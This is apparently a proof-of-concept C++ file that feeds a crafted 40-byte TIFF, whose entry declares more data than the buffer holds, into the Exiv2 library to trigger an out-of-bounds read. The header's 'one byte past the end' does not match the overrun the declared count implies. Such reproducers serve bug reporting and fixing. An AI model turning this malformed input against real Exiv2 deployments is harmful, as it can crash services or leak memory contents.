// PoC: OOB read of one byte past the end of the metadata buffer, reached
// through the public API (Exiv2::ImageFactory::open + Image::readMetadata).
// Build: clang++ -std=c++17 -fsanitize=address -g -O1 -I<include> pocs/newbug.cpp -lexiv2
#include <exiv2/exiv2.hpp>

#include <cstdio>
#include <cstring>
#include <vector>

// Minimal little-endian TIFF: 40-byte buffer, IFD0 with one UNDEFINED entry
// whose value offset is 30 and whose declared count (64) exceeds the 10 bytes
// that remain in the buffer.
static const unsigned char tiff[] = {
    0x49, 0x49, 0x2a, 0x00,             // II, 42
    0x08, 0x00, 0x00, 0x00,             // offset of IFD0
    0x01, 0x00,                         // IFD0: 1 entry
    0x0e, 0x01, 0x07, 0x00, 0x40, 0x00, 0x00, 0x00,  // ImageDescription, UNDEFINED, count 64
    0x1e, 0x00, 0x00, 0x00,             // value offset = 30
    0x00, 0x00, 0x00, 0x00,             // next IFD = 0
    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,  // 26..33: value area
    0x41, 0x41, 0x41, 0x41, 0x41, 0x41,              // 34..39: last 6 bytes
};

int main() {
  std::vector<Exiv2::byte> buf(sizeof(tiff));
  std::memcpy(buf.data(), tiff, buf.size());
  try {
    auto image = Exiv2::ImageFactory::open(buf.data(), buf.size());
    image->readMetadata();
    std::printf("keys: %zu\n", image->exifData().count());
  } catch (const std::exception& e) {
    std::printf("exception: %s\n", e.what());
  }
  return 0;
}
